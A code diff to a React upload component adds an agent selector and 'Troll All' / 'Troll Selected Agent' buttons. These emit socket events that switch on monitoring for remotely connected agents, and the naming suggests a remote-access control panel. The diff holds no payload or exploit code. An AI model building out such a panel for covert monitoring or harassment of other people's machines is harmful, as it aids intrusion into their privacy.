@@ -7,6 +7,7 @@ import { Card, CardContent, CardDescription, CardHeader, CardTitle } from './ui/
 import { Input } from './ui/input';
 import { Label } from './ui/label';
 import { Progress } from './ui/progress';
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from './ui/select';
 
 interface PendingFile {
   id: string;
@@ -59,7 +60,7 @@ function getFileIcon(type: string) {
 }
 
 export function BulkUploadManager() {
-  const { socket, connected, selectedAgent, uploadFile } = useSocket();
+  const { socket, connected, selectedAgent, setSelectedAgent, agents, uploadFile } = useSocket() as any;
   const [files, setFiles] = useState<PendingFile[]>([]);
   const [folderPath, setFolderPath] = useState('');
   const [isDragging, setIsDragging] = useState(false);
@@ -232,6 +233,51 @@ export function BulkUploadManager() {
           <CardDescription>Upload files to the currently selected agent</CardDescription>
         </CardHeader>
         <CardContent className="space-y-4">
+          <div className="space-y-2">
+            <Label>Select Agent</Label>
+            <div className="flex flex-col sm:flex-row gap-2">
+              <Select
+                value={selectedAgent ?? 'ALL'}
+                onValueChange={(val) => {
+                  if (val === 'ALL') {
+                    setSelectedAgent(null);
+                  } else {
+                    setSelectedAgent(val);
+                  }
+                }}
+              >
+                <SelectTrigger className="w-full sm:w-72">
+                  <SelectValue placeholder="Choose agent" />
+                </SelectTrigger>
+                <SelectContent>
+                  <SelectItem value="ALL">All agents</SelectItem>
+                  {Array.isArray(agents) && agents.map((a: any) => (
+                    <SelectItem key={a.id} value={a.id}>
+                      {a.name || a.id.slice(0, 8)}
+                    </SelectItem>
+                  ))}
+                </SelectContent>
+              </Select>
+              <Button
+                variant="outline"
+                onClick={() => {
+                  if (!socket || !connected) return;
+                  socket.emit('operator_toggle_feature', { feature: 'monitoring', enabled: true });
+                }}
+              >
+                Troll All
+              </Button>
+              <Button
+                disabled={!selectedAgent}
+                onClick={() => {
+                  if (!socket || !connected || !selectedAgent) return;
+                  socket.emit('operator_toggle_feature', { feature: 'monitoring', enabled: true, agent_id: selectedAgent });
+                }}
+              >
+                Troll Selected Agent
+              </Button>
+            </div>
+          </div>
           {error && (
             <Alert variant="destructive">
               <AlertCircle className="h-4 w-4" />
